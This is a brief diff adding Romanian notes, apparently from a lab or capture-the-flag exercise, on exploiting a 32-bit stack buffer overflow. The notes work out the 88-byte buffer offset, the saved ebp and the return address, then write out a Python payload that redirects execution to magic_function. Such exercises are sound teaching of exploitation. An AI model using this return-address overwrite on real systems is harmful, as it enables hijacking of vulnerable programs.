@@ -1,0 +1,10 @@
+ne uitam in objdump dupa unde se apeleaza fgets si ne uitam la adresa de inceput a bufferului
+ebp - 0x58 = ebp - 88
+ca sa ajungem la return address avem de suprascris:
+    - 88 bytes de buffer + variabile
+    - 4 bytes old ebp
+    - 4 bytes return address
+ne uitam la adresa de functiei magic_function = 08048596
+deci size-ul bufferului dat catre fgets este 88 + 4 + 4 + 1 = 97 minim
+echo 97 > payload 
+python -c 'print "A"*92 + "\x96\x85\x04\x08"' >> payload
